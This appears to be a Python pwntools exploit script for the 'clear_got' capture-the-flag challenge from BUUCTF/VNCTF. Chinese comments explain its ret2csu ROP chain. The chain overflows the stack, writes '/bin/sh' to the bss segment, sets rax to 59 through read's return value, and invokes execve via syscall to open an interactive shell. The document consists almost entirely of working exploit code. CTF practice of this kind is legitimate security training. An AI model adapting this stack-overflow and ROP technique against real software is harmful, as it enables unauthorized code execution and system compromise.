#coding:utf-8
from pwn import *
context(arch='amd64',os='linux',log_level='debug')
p=process('/home/kk/ti/靶场/BUUCTF/clear_got/clear_got')
e=ELF('/home/kk/ti/靶场/BUUCTF/clear_got/clear_got')
pop_rdi_addr=0x4007f3
print('pid'+str(proc.pidof(p)))
offset=0x60
syscall_addr=0x40077E
write_addr=0x400773
csu_gadget1=0x4007EA
csu_gadget2=0x4007D0
term_proc=0x600e50
bss_addr=0x601060
payload=(offset+8)*b'a'
payload+=p64(csu_gadget1)
payload+=p64(0) #rbx
payload+=p64(1)#rbp
payload+=p64(term_proc)#r12 空函数#第一次ret2csu的目的是传read函数参数，并且在最后的ret去执行系统调用，第一次不需要用到call，因此call一个空函数
payload+=p64(59)#r13 rdx #执行一次syscall之后，rax就变成了0x3b
payload+=p64(bss_addr)#r14  #rsi  #将/bin/sh写入bss段
payload+=p64(0)#r15  #rdi
payload+=p64(csu_gadget2)
payload+=b'a'*8#下面的48个数据不用垃圾填充，直接进行下一轮涉及参数，这8个垃圾数据填充的是add rsp,8
payload+=p64(0)
payload+=p64(1)
payload+=p64(bss_addr+0x8)#此时用call来执行输入到bss段里的syscall
payload+=p64(0)
payload+=p64(0)
payload+=p64(bss_addr)
payload+=p64(syscall_addr)
payload+=p64(csu_gadget2)
p.sendafter('Welcome to VNCTF! This is a easy competition.///\n',payload)
payload=b'/bin/sh\x00'+p64(syscall_addr)+b'\x00'.ljust(59,b'\x00')#这里一定要凑齐59，使得read函数的返回值，也就是让rax变成59
p.sendline(payload)
p.interactive()
